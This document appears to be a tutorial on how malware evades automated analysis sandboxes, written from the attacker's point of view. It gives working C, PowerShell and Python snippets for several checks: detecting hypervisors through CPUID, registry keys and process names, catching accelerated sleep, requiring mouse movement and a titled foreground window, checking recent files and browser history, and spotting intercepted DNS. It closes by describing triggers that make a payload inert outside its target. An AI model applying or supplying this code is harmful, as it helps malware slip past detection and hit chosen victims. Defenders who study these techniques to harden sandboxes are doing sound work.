# Sandbox evasion

Automated malware analysis sandboxes execute a sample and record its behaviour:
API calls, network traffic, file operations, registry changes. If the sample detects
that it is being analysed, it can sleep, exit cleanly, or behave benignly until the
analysis window closes.

Sandboxes are rude: they accelerate time, simulate user activity imperfectly, run
on virtual machines with obvious hardware signatures, and impose strict time limits
on analysis. These imperfections are the attack surface.

## VM and hypervisor detection

Most sandboxes run samples inside virtual machines. VM environments leave detectable
artefacts:

Registry keys from common hypervisors:

```text
HKLM\SOFTWARE\VMware, Inc.\VMware Tools
HKLM\SOFTWARE\Oracle\VirtualBox Guest Additions
HKLM\SYSTEM\ControlSet001\Services\VBoxGuest
HKLM\HARDWARE\ACPI\DSDT\VBOX__
```

Process names indicating VM tools or sandbox agents:

```text
vmtoolsd.exe, vmwaretray.exe, vmwareuser.exe  # VMware
vboxservice.exe, vboxtray.exe                  # VirtualBox
sandboxie.exe, sbiectrl.exe                    # Sandboxie
wireshark.exe, procmon.exe, procexp.exe        # analysis tools
```

Hardware characteristics: CPUID instruction returns hypervisor information in bit 31
of ECX when run in a virtualised environment. MAC address OUI prefixes: VMware uses
00:0C:29 and 00:50:56; VirtualBox uses 08:00:27.

```c
// CPUID hypervisor check (x86/x64)
int info[4];
__cpuid(info, 1);
bool in_hypervisor = (info[2] >> 31) & 1;

// registry check
HKEY hKey;
if (RegOpenKeyExA(HKEY_LOCAL_MACHINE,
    "SOFTWARE\\VMware, Inc.\\VMware Tools", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
    // in a VMware VM
}
```

## Time-based evasion

Sandboxes typically impose a 60-300 second analysis window and accelerate sleep calls
to prevent evasion via trivial sleeping.

Reliable time-based evasion requires checking whether time actually passed, not
relying on sleep duration:

```c
FILETIME ft1, ft2;
GetSystemTimeAsFileTime(&ft1);
Sleep(30000);  // 30 seconds
GetSystemTimeAsFileTime(&ft2);

ULONGLONG elapsed_ms = (*(ULONGLONG*)&ft2 - *(ULONGLONG*)&ft1) / 10000;
if (elapsed_ms < 25000) {
    // sleep was accelerated; abort
    ExitProcess(0);
}
```

Alternative timing sources that are harder to accelerate: counting CPU cycles
(RDTSC instruction), making many hash computations and checking wall clock, checking
the system uptime via `GetTickCount64` against expected minimum values.

## User interaction requirements

Automated analysis does not produce real user behaviour. Gates on user activity:

```c
// require mouse movement
POINT p1, p2;
GetCursorPos(&p1);
Sleep(5000);
GetCursorPos(&p2);
if (p1.x == p2.x && p1.y == p2.y) ExitProcess(0);

// require realistic cursor position (not 0,0 or the sandbox default)
if (p1.x < 100 && p1.y < 100) ExitProcess(0);

// require a foreground window with a title
HWND fg = GetForegroundWindow();
if (!fg) ExitProcess(0);
char title[256];
GetWindowTextA(fg, title, 255);
if (strlen(title) == 0) ExitProcess(0);
```

Requiring a specific number of mouse clicks before detonation is a higher bar: some
automated systems now simulate mouse movement but not click sequences.

## Environment plausibility checks

A real workstation has history: browser history, recently opened documents, installed
applications, user profiles with content. Sandboxes are often clean images.

```powershell
# check for recently accessed files (a real user has some)
$recentFiles = [System.IO.Directory]::GetFiles(
    [System.IO.Path]::Combine($env:APPDATA, 'Microsoft\Windows\Recent'), '*')
if ($recentFiles.Count -lt 5) { exit }

# check for reasonable number of running processes
$procCount = (Get-Process).Count
if ($procCount -lt 30) { exit }

# check for browser history (a real user has used a browser)
$historyPath = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\History"
if (-not (Test-Path $historyPath)) { exit }
```

## Network-based checks

Some sandboxes intercept all DNS and HTTP traffic and return fabricated responses.
This is detectable:

- DNS queries for known non-existent domains that should return NXDOMAIN. If they
  resolve, the network is being intercepted.
- Checking the external IP address against known hosting/sandbox ranges.
- Attempting a connection to a known-down server; if it succeeds, the sandbox is
  returning fake responses.

```python
import socket

# query a domain that definitely does not exist
try:
    socket.gethostbyname('this.domain.definitely.does.not.exist.example')
    # resolved: sandbox is intercepting DNS
    import sys; sys.exit(0)
except socket.gaierror:
    pass  # correct: NXDOMAIN, real network
```

## Trigger conditions

Deferring execution until a specific condition is met that the sandbox cannot predict
or replicate:

- A specific date or time (execute only after a certain date)
- A specific geographic location (check IP geolocation against target country)
- The presence of a specific file, registry key, or process that would only be
  present in the target environment
- A specific username or domain membership

These turn the payload into a targeted weapon that is inert in any other environment.
The trade-off is that the condition must be reliably present in the target environment
when execution is needed.
